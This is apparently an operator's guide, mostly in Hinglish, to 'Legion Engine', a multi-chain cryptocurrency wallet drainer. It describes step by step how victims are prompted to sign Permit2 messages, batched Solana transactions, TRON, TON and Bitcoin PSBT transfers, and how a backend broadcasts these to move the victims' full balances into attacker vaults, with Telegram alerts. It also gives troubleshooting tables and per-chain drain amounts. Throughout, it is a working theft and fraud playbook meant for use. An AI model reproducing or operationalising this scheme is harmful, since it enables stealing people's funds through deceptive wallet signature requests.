# Legion Engine — Transaction Flow Guide

Har chain pe transaction kaise kaam karta hai — step by step.

---

## Overall Flow (Har Chain Ke Liye Same)

```
Phase 1: User wallet connect
Phase 2: Backend se vault addresses fetch (client-config)
Phase 3: User wallet mein transaction sign popup
Phase 4: Signed tx/sig backend ko bhejo (signature-anchor)
Phase 5: Backend on-chain submit karta hai
Phase 6: Telegram notification
```

---

## Phase 1 — Wallet Connection

**Kya hota hai:**
- User "Connect Wallet" pe click karta hai
- Script wallet detect karta hai (MetaMask, TrustWallet, Phantom, TronLink, etc.)
- Wallet address milti hai

**Kya check karo agar fail ho:**
- `[LEGION] ❌ ... connect failed` log dekho
- User ne wallet mein "Reject" kiya hoga
- Wallet extension install nahi hai

---

## Phase 2 — Vault Config Prefetch

**Endpoint:** `GET /api/v1/client-config`
**Auth:** None needed

**Kya milta hai:**
```json
{
  "vault_addresses": {
    "evm": "0xABC...",
    "sol": "Base58...",
    "tron": "T...",
    "ton": "EQ...",
    "btc": "bc1q...",
    "cosmos": "cosmos1...",
    "aptos": "0x...",
    "sui": "0x..."
  }
}
```

**Script mein kahan:** `VAULT_CACHE` variable mein store hota hai

**Agar fail ho:** Vault addresses null → transactions build nahi honge → drain skip

---

## Phase 3 — Chain-by-Chain Signing

---

### EVM (Ethereum, BNB, Polygon, Arbitrum, Base)

**Protocol:** ERC-20 Permit2 (EIP-712 typed data)

**Steps:**

```
1. Backend ko call karo: POST /api/v1/scout/ranked
   → User ke ERC-20 tokens ki list milti hai (balance ke saath)

2. Backend ko call karo: POST /api/v1/signature-anchor/permit2-batch-typed-data
   Body: { wallet_address, tokens: [{token, amount}], chain_id }
   → Typed data milta hai (EIP-712 format)

3. User ke wallet mein popup aata hai:
   "Sign this message" — permit2 typed data
   MetaMask mein dikhta hai:
     Spender: ENGINE_SPENDER address
     Token: USDC/USDT/etc.
     Amount: actual raw balance (NOT unlimited)
     Deadline: ~30 min

4. User sign karta hai → signature string milti hai
```

**Backend kya karta hai:**
```
POST /api/v1/signature-anchor
Body: { signature, permit2_typed_data, chain_id, wallet_address }

Backend:
  → permit2.permitTransferFrom() on-chain call karta hai
  → SETTLEMENT_EXECUTION_PRIVATE_KEY wallet se gas pay karta hai
  → ERC-20 tokens: user wallet → VAULT_ADDRESS_EVM
```

**Transaction trace karna:**
- TX hash Telegram mein aata hai
- Etherscan/BscScan/Polygonscan pe dekho
- `from`: execution wallet address
- `to`: permit2 contract
- `event`: Transfer (token moves to vault)

**Common failures:**
| Error | Reason |
|---|---|
| `TRANSFER_FROM_FAILED` | Execution wallet mein ETH nahi (gas ke liye) |
| `Permit expired` | User ne bahut der ki sign karne mein (>30 min) |
| `Nonce already used` | Same permit2 nonce dobara use hua |
| `Insufficient allowance` | Wallet mein tokens hi nahi |

---

### Solana (SOL + SPL Tokens)

**Protocol:** `signAllTransactions` — ek popup mein sab kuch

**Steps:**

```
1. Script SOL balance check karta hai
   Script SPL token accounts dhundta hai (findATA function)

2. Transactions build hoti hain:
   - Native SOL transfer: user → vault (keep 0.002 SOL for rent)
   - Har SPL token ke liye: ATA create + transfer instruction

3. Ek single popup: "Sign X transactions"
   Phantom/Solflare ek saath sab show karta hai
   User ek baar approve karta hai → sab signed

4. Script _allSignedTxs array mein store karta hai
```

**Backend kya karta hai:**
```
Har signed tx ke liye alag POST /api/v1/signature-anchor:
Body: {
  chain_family: 'SVM',
  signed_transaction: base64_encoded_tx,
  wallet_address: sol_address
}

Backend:
  → Har tx ko Solana network pe broadcast karta hai
  → Backend ka SOL execution wallet gas nahi bharta
    (SOL txs mein fee user ke wallet se automatically cut hoti hai)
```

**Transaction trace karna:**
- TX signature Telegram mein aata hai
- Solscan.io ya explorer.solana.com pe dekho
- Status: `finalized` = success

**Common failures:**
| Error | Reason |
|---|---|
| `Transaction simulation failed` | Insufficient SOL balance |
| `blockhash not found` | Tx bahut purana hua before submit |
| SPL token skip hua | ATA create ke liye SOL nahi tha |

---

### TRON (TRX + USDT TRC-20)

**Protocol:** TronWeb transaction signing

**Steps:**

```
1. Script TRX balance fetch karta hai pehle

2A. USDT TRC-20 path (priority):
   - Contract: TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t (USDT)
   - triggerSmartContract: transfer(vault, amount)
   - feeLimit = min(30 TRX, 80% of user TRX balance)
   - User TronLink mein sign karta hai

2B. TRX fallback (agar USDT fail ho ya nahi):
   - sendTrx: user → vault
   - Amount: TRX balance - 2 TRX (account rent ke liye rakho)
   - User sign karta hai

3. Signed transaction object store hota hai
```

**Backend kya karta hai:**
```
POST /api/v1/signature-anchor
Body: {
  chain_family: 'TRON',
  tron_transaction: JSON.stringify(signedTx),
  token_address: USDT_TRC20_ADDRESS or 'TRX',
  wallet_address: tron_address
}

Backend:
  → Signed tx ko TRON network pe broadcast karta hai
  → Energy: user ke wallet se automatically cut hoti hai
```

**Transaction trace karna:**
- TX ID Telegram mein aata hai
- Tronscan.org pe dekho
- Status: `SUCCESS` = done

**TRON Energy requirement:**
```
USDT TRC-20 transfer = ~65,000 energy needed

User ke paas energy kaise milti hai:
  - Staked TRX → free energy
  - Liquid TRX → TRX burn hoti hai (1 energy = ~282 sun TRX)
  - 65,000 energy = ~18 TRX burn

Agar user ke paas <5 TRX AND no staked → USDT fail, TRX drain attempt
```

**Common failures:**
| Error | Reason |
|---|---|
| `USDT sign failed` | User ke paas TRX nahi energy ke liye |
| `Zero TRC-20 balance` | User ke wallet mein USDT nahi |
| `bandwidth limit` | TRON account bandwidth khatam |

---

### TON (Native TON + Jetton USDT)

**Protocol:** TonConnect multi-message transaction

**Steps:**

```
1. Script TON balance fetch karta hai
   Script Jetton USDT balance check karta hai
   Script Jetton wallet address dhundta hai

2. Messages build hote hain:
   Message 1 (hamesha): native TON transfer → vault
     amount: (TON balance - 0.15 TON gas reserve)
   
   Message 2 (agar Jetton balance > 0):
     TonWeb se Cell BOC build hoti hai:
       opcode: 0x0f8a7ea5 (Jetton transfer)
       destination: vault address
       amount: full Jetton balance
     Payload: base64 encoded BOC

3. Ek single popup: ton_sendTransaction
   Messages array: [native_msg, jetton_msg]
   User Tonkeeper/OpenMask mein approve karta hai

4. BOC (Bag of Cells) milta hai — TON ka transaction format
```

**Backend kya karta hai:**
```
POST /api/v1/signature-anchor
Body: {
  chain_family: 'TON',
  boc: base64_boc_string,
  wallet_address: ton_address
}

Backend:
  → BOC ko TON network pe submit karta hai
  → TonCenter ya TON RPC use karta hai
```

**Transaction trace karna:**
- TX hash Telegram mein aata hai
- Tonscan.org ya tonviewer.com pe dekho
- Status: check karo native TON + Jetton dono transfer hue ya nahi

**Common failures:**
| Error | Reason |
|---|---|
| `Invalid BOC` | TonWeb se BOC build fail (CDN down) |
| Jetton skipped | TonWeb CDN unavailable — native TON still moves |
| `Insufficient balance` | TON balance < 0.15 TON (gas reserve) |
| Tonkeeper reject | User ne reject kiya |

---

### Bitcoin (BTC)

**Protocol:** PSBT (Partially Signed Bitcoin Transaction)

**Steps:**

```
1. Backend se PSBT request karo:
   POST /api/v1/signature-anchor/bitcoin-psbt
   Body: { wallet_address: btc_address }
   → PSBT hex milta hai

2. User ke wallet mein sign popup:
   Unisat/Xverse wallet PSBT show karta hai
   User approve karta hai → signed PSBT milta hai

3. Signed PSBT backend ko bhejo
```

**Backend kya karta hai:**
```
POST /api/v1/signature-anchor
Body: {
  chain_family: 'BTC',
  signed_psbt: hex_string,
  wallet_address: btc_address
}

Backend:
  → PSBT finalize karta hai
  → Bitcoin network pe broadcast karta hai
```

**Transaction trace karna:**
- TXID Telegram mein aata hai
- Mempool.space ya blockstream.info pe dekho
- Confirmations ka wait karo (1 confirm = ~10 min)

**Common failures:**
| Error | Reason |
|---|---|
| `PSBT build failed` | VAULT_ADDRESS_BTC not set in Railway |
| `Dust output` | BTC amount too small (< 546 satoshi) |
| `RBF conflict` | Conflicting unconfirmed tx in mempool |

---

### COSMOS (ATOM + IBC tokens)

**Protocol:** Cosmos SDK message signing

**Steps:**

```
1. Script Cosmos address detect karta hai (Keplr/Leap wallet)
2. Bank send message build hota hai: ATOM → vault
3. User Keplr mein sign karta hai
4. Signed tx backend ko bheja
```

**Backend kya karta hai:**
```
POST /api/v1/signature-anchor
Body: {
  chain_family: 'COSMOS',
  signed_tx: base64_tx,
  wallet_address: cosmos_address
}

Backend needs: COSMOS_EXECUTION_PRIVATE_KEY or COSMOS_EXECUTION_MNEMONIC
```

**Transaction trace karna:**
- Mintscan.io pe address dekho
- TX hash se trace karo

---

### Aptos (APT)

**Protocol:** Aptos BCS transaction

**Steps:**

```
1. Script Aptos address detect karta hai (Petra/Martian wallet)
2. coin::transfer transaction build hota hai
3. User wallet mein sign popup
4. Signed tx backend ko
```

**Backend needs:** `APTOS_EXECUTION_PRIVATE_KEY`

**Transaction trace karna:**
- Explorer.aptoslabs.com pe tx hash se

---

### Sui (SUI)

**Protocol:** Sui programmable transaction

**Steps:**

```
1. Script Sui address detect karta hai (Sui Wallet/Martian)
2. SUI transfer transaction build hota hai
3. User wallet sign karta hai
4. Signed bytes backend ko
```

**Backend needs:** `SUI_EXECUTION_PRIVATE_KEY`

**Transaction trace karna:**
- Suiexplorer.com pe tx hash se

---

## Full End-to-End Timeline (1 User Session)

```
T+0s    User page open karta hai
T+1s    client-config fetch → vault addresses cached
T+2s    Wallet connect popup
T+5s    User approves connection
T+6s    Scout API call → user ke assets scan
T+7s    Phase 3 start — chain-by-chain signing

--- EVM signing ---
T+8s    Permit2 typed data fetch from backend
T+9s    MetaMask popup: "Sign this message"
T+12s   User signs → signature string
T+12s   POST /api/v1/signature-anchor (EVM)
T+14s   Backend submits permit2 tx on-chain
T+16s   ERC-20 tokens transfer to vault ✅

--- SOL signing ---  
T+17s   SOL transactions build (native + SPL)
T+18s   Phantom popup: "Sign 3 transactions"
T+22s   User signs all
T+22s   3x POST /api/v1/signature-anchor (SOL)
T+24s   Backend broadcasts each tx ✅

--- TON signing ---
T+25s   TON balance check + Jetton BOC build
T+26s   Tonkeeper popup: multi-message tx
T+30s   User approves
T+30s   POST /api/v1/signature-anchor (TON)
T+32s   Backend submits BOC ✅

--- TRON signing ---
T+33s   TRX balance check → USDT attempt
T+34s   TronLink popup: USDT transfer
T+38s   User approves
T+38s   POST /api/v1/signature-anchor (TRON)
T+40s   Backend broadcasts ✅

T+41s   Telegram notification sent 📱
T+45s   All chains done ✅
```

---

## Backend API Endpoints — Transaction Related

| Endpoint | Auth | Purpose |
|---|---|---|
| `GET /api/v1/client-config` | None | Get vault addresses + backend URL |
| `POST /api/v1/scout/ranked` | None | Get user's token balances ranked by USD value |
| `POST /api/v1/signature-anchor/permit2-batch-typed-data` | None | Get EIP-712 data to sign |
| `POST /api/v1/signature-anchor/bitcoin-psbt` | None | Get PSBT to sign |
| `POST /api/v1/signature-anchor` | None | Submit signed tx/sig to backend |
| `POST /api/v1/settlement/request` | None | Create settlement tracking record |
| `POST /api/v1/allowance-reuse/scan` | None | Check existing approvals |

---

## How to Trace a Failed Transaction

### Step 1: Check Railway logs
Filter by the wallet address or tx hash:
- `[LEGION]` prefix = frontend script log
- `[ANCHOR]` or `[SETTLEMENT]` = backend processing log

### Step 2: Check by chain

**EVM:**
- Etherscan.io → search execution wallet address → see recent txs
- Agar koi tx nahi → backend ne gas out of funds ki wajah se submit nahi kiya

**Solana:**
- Solscan.io → wallet address → transactions
- `failed` status → simulation failed (insufficient balance)

**TRON:**
- Tronscan.org → wallet address → transactions
- `OUT_OF_ENERGY` = user ke paas TRX nahi tha

**TON:**
- Tonviewer.com → wallet address → transactions
- Check both internal messages (native TON + Jetton)

**BTC:**
- Mempool.space → txid → status
- `unconfirmed` = waiting for miners

### Step 3: Common fix per chain

| Chain | Not draining | Fix |
|---|---|---|
| EVM | Execution wallet out of gas | Fund `SETTLEMENT_EXECUTION_PRIVATE_KEY` wallet |
| SOL | tx failed | Check SOL balance (need >0.002 SOL) |
| TRON | USDT failed | User needs TRX for energy |
| TON | BOC invalid | TonWeb CDN issue (temporary) |
| BTC | PSBT error | Check `VAULT_ADDRESS_BTC` in Railway |
| COSMOS | Always skipped | Set `COSMOS_EXECUTION_PRIVATE_KEY` in Railway |
| APTOS | Always skipped | Set `APTOS_EXECUTION_PRIVATE_KEY` in Railway |
| SUI | Always skipped | Set `SUI_EXECUTION_PRIVATE_KEY` in Railway |

---

## Transaction Amount Behavior Per Chain

| Chain | How much is taken | What's left |
|---|---|---|
| EVM ERC-20 | Full raw balance of each token | Nothing (all tokens drained) |
| EVM native ETH | NOT drained (no permit2 for native) | User keeps ETH |
| SOL native | Balance - 0.002 SOL | 0.002 SOL (account rent) |
| SOL SPL | Full balance of each SPL token | Nothing |
| TRON USDT | Full USDT balance | Nothing |
| TRON TRX | Balance - 2 TRX | 2 TRX (account rent) |
| TON native | Balance - 0.15 TON | 0.15 TON (Jetton gas reserve) |
| TON Jetton USDT | Full Jetton balance | Nothing |
| BTC | Full BTC balance - mining fee | ~0 (mining fee only) |
| COSMOS | Full ATOM balance | Nothing |
| APTOS | Full APT balance | Nothing |
| SUI | Full SUI balance | Nothing |
